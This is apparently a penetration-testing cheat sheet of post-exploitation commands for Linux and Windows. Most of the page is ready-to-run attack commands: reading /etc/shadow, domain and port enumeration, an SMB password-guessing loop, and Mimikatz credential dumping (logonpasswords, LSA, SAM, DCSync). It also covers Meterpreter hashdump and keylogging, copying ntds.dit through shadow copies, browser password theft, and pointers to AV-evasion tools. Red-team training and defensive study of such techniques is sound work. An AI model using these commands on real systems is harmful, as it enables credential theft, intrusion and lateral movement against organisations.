---
title: Landing Commands
category: Post-Exploitation
order: 2
---

> **Linux**

Kernal version  | <code> uname -r </code>
Distro Version | <code>cat /etc/issue </code>
Determine Account | <code> whoami </code>
Add User | <code> useradd -d [home_dir] [login name] </code>
Privilidges |<code>  id </code>
Network Activity | <code> netstat -natu </code>
ARP Cache | <code> arp -a </code>
Routing Table | <code> netstat -nr </code>
Lockout Policy | <code> grep tally /etc/pam.d/* <br> grep tally /etc/pam.conf" </code>
Find Public IP Address | <code> curl icanhazip.com <br> nslookup myip.opendns.com resolver1.opendns.com </code>
Passwords and Users | <code> cat etc/passwd && cat etc/shadow </code>
Wifi Password | <code> /etc/NetworkManager/system-connections </code>
Gnome Keyring | <code> ~/.gnome/keyrings </code>
Find Interesting Files | <code> wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE </code>
Find Interesting File Names and Perms | <code> find / -iname "shadow*" -perm /o+r -ls 2>/dev/null </code>
Find Interesting Content Files 1 | <code> grep -irIL pass /opt/ 2>/dev/null </code>
Find Interesting Content Files 2 | <code> find /home -iname "*.txt" 2>/dev/null -exec grep -c 2 -li  'pass' {} \; </code>
Find Interesting Content Regex | <code> find /home -iname "*.txt" 2>/dev/null -exec egrep -li "^.+@.+$" {} \; </code>

> **Local Windows Accounts and Processes**

Determine Account | <code> whoami, set username, echo %username% </code>
Determine OS Information | <code> wmic os get Caption <code>
Determine OS Information 1 | <code> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" </code>
Determine OS Information 2 | <code> wmic computersystem LIST full </code>
Anti-Virus info | <code> wmic /namespace:\\root\securitycenter2 path antivirusproduct </code>
Patches Installed | <code> wmic qfe list brief </code>
Patches Installed  | <code> systeminfo </code>
Processes | <code> tasklist /V /FO CSV </code>
Services | <code> sc query </code>
List Users | <code> net user <br> wmic useraccount list brief </code>
Check Privs of Users | <code> net user [username] </code>
List Groups | <code> net localgroup [/domain] <br> net group [/domain] </code> 
List Administrators | <code> net localgroup administrators [/domain] </code> 
List Password and Lockout Policy | <code> net accounts or net accounts /domain </code> 
Find Public IP Address | <code> curl icanhazip.com <br> nslookup myip.opendns.com resolver1.opendns.com </code>
List Groups for Account | <code> DSQUERY USER -samid loginname | DSGET USER -memberof -expand </code>
Inventory Software | <code> dir /s  c:\Program Files > inventory.txt <br> dir /s ""c:\Program Files (x86)"" >> inventory.txt <br> set path </code>
Find Interesting Files | <code> ls -r -file -filter pass* </code>
Find Interesting Info in Files | <code> ls -r c:\ -file | % {select-string -path $_ -pattern mypassword} </code>

If using meterpreter run getprivs, you are an admin if it looks like this:

==============<br>
Not Admin<br>
==============<br>
  SeShutdownPrivilege<br>
  SeChangeNotifyPrivilege<br>
  SeUndockPrivilege<br>

==============<br>
Not Admin<br>
==============<br>
  SeDebugPrivilege<br>
  SeIncreaseQuotaPrivilege<br>
  SeSecurityPrivilege<br>
  SeTakeOwnershipPrivilege<br>
  SeLoadDriverPrivilege<br>
  SeSystemProfilePrivilege<br>
  SeSystemtimePrivilege<br>
  SeProfileSingleProcessPrivilege<br>
  SeIncreaseBasePriorityPrivilege<br>
  SeCreatePagefilePrivilege<br>
  SeBackupPrivilege<br>
  SeRestorePrivilege<br>
  SeShutdownPrivilege<br>
  SeSystemEnvironmentPrivilege<br>
  SeChangeNotifyPrivilege<br>
  SeRemoteShutdownPrivilege<br>
  SeUndockPrivilege<br>
  SeManageVolumePrivilege<br>

> **Windows Domain  Enumeration**

List Domain Info | <code> wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE </code>
MSF Domain Info | <code> run post/windows/gather/enum_domain </code>
List Domain User Info | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='testAccount'" GET  </code>
List All Users | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname </code>
List All Groups | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname </code>
List Members of Group (e.g., domain admin) | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value </code>
List all computers on domain | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname </code>
List all computers on domain | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname </code>
List Domain Controllers | <code> NETDOM QUERY /D:MyDomain DC </code>
List Domain Controllers | <code> DSQUERY Server </code>
List Member Servers | <code> NETDOM QUERY /D:MyDomain SERVER </code>
List all Workstations | <code> NETDOM QUERY /D:MyDomain WORKSTATION </code>
List all shares for a system | <code> net view [system] /ALL [/Domain] </code>

> **Windows Network Enumeration**

IP address | <code> ipconfig /all </code>
DNS Cache | <code> ipconfig /displaydns </code>
Arp Cache | <code> arp -a </code>
Network Activity | <code> netstat -na | find "ESTABLISHED" </code>
Routing Table | <code> netstat -nr  </code>
Firewall | <code> netsh firewall show state <br> netsh firewall show config </code>
Ping Sweep | <code> for /L %i in (1, 1, 255) do @ping -n 1 192.168.2.%i | find "TTL" </code> 
DNS Lookup | <code> for /L %i in (1, 1, 255) do @echo 10.10.10.%i & nslookup 10.10.10.%i  2>nul | find "Name" </code> 
PowerShell port scanner | <code> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null </code>
Scan a range of IPs for a single port | <code> foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip} </code>
PS IP range & port range scanner | <code> 1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null} </code>
PS test egress filtering | <code> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port $_ is open!" } 2>$null </code>
Password Guess | <code> for /f %i in (password.lst) do @echo %i & @net use \\[tartet_IP_addr] %i /u:[UserName] 2>nul && echo [UserName]: %i >> success.txt </code> 

>**Mimikatz**

{% highlight bash %}
Mimikatz
\\get architecture
C:\beachead>SET Processor
\\Run correct mimikatz
C:\beachead>mimikatz32.exe
\\Obtain debug permissions
mimikatz # privilege::debug
\\log actions
mimikatz # log
\\Try and get logonpasswords
mimikatz # sekurlsa::logonpasswords
\\ dump all Active Directory domain credentials from a Domain Controller
mimikatz # LSADUMP::LSA /inject
\\Dump Hashes
mimikatz # LSADUMP::SAM
\\List Tokens
mimikatz # TOKEN::List
\\Get tickets
mimikatz # SEKURLSA::Tickets
\\mimikatz # lsadump::secrets
{% endhighlight %}

* [AV Bypass](http://www.blackhillsinfosec.com/?p=5555)

**Metasploit Mimikatz**

{% highlight bash %}
#Migrate to a process with your current architecture
sysinfo
ps
migrate [pid]

#Load mimikatz
load mimikatz; or
use kiwi
msv
kerberos
{% endhighlight %}

**Mimikatz from Memory Image**

<code> vol.py -f system_image.vmem --profile=Win7SP1x64 mimikatz </code>

>**Password Hashes and Key Logging**

Domain Hashes | Only vulnerable to the extraction from the LSASS memory on local boxy
Password Hashes in SAM (Not Accessable After Boot) | <code> C:\Windows\System32\Config </code>
Password Hashes in SAM Registry Location |  <code> HKEY_ LOCAL_MACHINE\SAM </code>
Obtain Passwords from SAM (requires system privs) | <code> reg save hklm\sam c:\sam  && reg save hklm\system c:\system </code>
Obtain Passwords from SAM (sam and system) | <code> samdump2 system sam </code>
Metasploit Key logger for passwords | keyscan_start, keyscan_stop, keyscan_dump
PwDump | Pwdump drops files to disk and caught by AV <br> http://www.tarasco.org/security/pwdump_7/
Fgdump | fgdump drops files to disk and caught by AV <br> Source available to evade AV <br> http://foofus.net/goons/fizzgig/fgdump/downloads.htm#previous-version
Other PWDump Versions | http://www.openwall.com/passwords/windows-pwdump
[Windows Credential Editor (WCE)](https://www.ampliasecurity.com/research/windows-credentials-editor/) | wce64.exe -w

**Metasploit hashdump**

{% highlight bash %}
meterpreter >hashdump (from memory)
meterpreter > run hashdump (hash and syskey from registry)

Empty String if it doesn't work: 31d6cfe0d16ae931b73c59d7e0c089c0
Smart hash dump may not work on new systems due to encrpytion change
{% endhighlight %}

**Internal Monologue Attack (NTMLv1 Hashes)**

* Must be an Administrator
* Changes the registry setting to use NTLMv1 instead of 2 (reverts changes after)
* Retrieves the list of non-network login tokens of the currently running processes
*  For each token, it uses impersonation to force the host to provide an NTLMv1 response to the chosen challenge.
* <code> InternalMonologue.exe -Downgrade true -Threads true -Impersonate true </code>
* (Download Internal Monologue)[https://github.com/eladshamir/Internal-Monologue]

**DCSync: Obtain Domain Account Hashes**

* Usually requires admin, domain admin, or enterpirse admin
* Can be done with Mimikatz, Impact, DSInternals

Mimikatz | <code> lsadump::dcsync /all /csv </code>

**Windows Credential Guard**

* SAM dumps still works like Mimikatzs lsadump::sam

**Volume Shadow Copy Service (domain controller)**

{% highlight bash %}
cscript vssown.vbs /status or /start or /create /c
copy \\ ? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit ntdsbackup.dit 
copy \\ ? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM systembackup.bak
copy \\ ? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM sambackup.bak

Analyze with ntds Dump Hash
{% endhighlight %}

Required Tools:
* [vssown vbs](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs)  
* [vssown py](https://github.com/MarkBaggett/MarkBaggett/blob/master/vssown.py)
* [ntds Dump Hash](http://csabarta.com/downloads/ntds_dump_hash.zip)

> **Browsers**

Finding user browser history and passwords in Firefox history:
{% highlight bash %}
sqlite3 ~/pilfered-firefox-profile/gn2uzbr6.Default\ User/places.sqlite sqlite> select * from moz_places where url like "%@%";

Cd ~/.mozilla/firefox/g4iiysbk.default/Cache
Strings [filename] | grep [file eg php]
{% endhighlight %}

Chrome: 
* [Browser Gather](https://github.com/sekirkity/BrowserGather)
* [ChromeDump](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-ChromeDump.ps1)
* [ChromeDump](https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-ChromeDump.ps1)

> **Survey**

* [Clicky](https://gist.github.com/leechristensen/10999daab91b3b34108a9e7201838452)
* [WLAN keys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1)
* [SessionGopher](https://github.com/fireeye/SessionGopher)


> **Interesting Files**

Passwords.txt	| Users often create password files as reminders.
wp-config.php | 	WordPress configuration file. Stores database passwords.
key3.db / logins.json	| Password file for the Firefox web browser.
<custom>.sh	| Administrators often store plaintext passwords in automation scripts
fstab	| The fstab may contain passwords to mounted samba shares
*.pst	| Users may email passwords around. These can often be found in .pst files
  
> **Regex Library**

[regexlib](http://www.regexlib.com/)


References:
* [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/Mimikatz/)
* [Golden Ticket](https://www.christophertruncer.com/golden-ticket-generation/) 
* [Mimikatz to dump passwords](http://blog.opensecurityresearch.com/2012/06/using-mimikatz-to-dump-passwords.html) 
* [Domain Passwords](http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html)
* [Password Hash Tool](https://www.tobtu.com/tools.php)

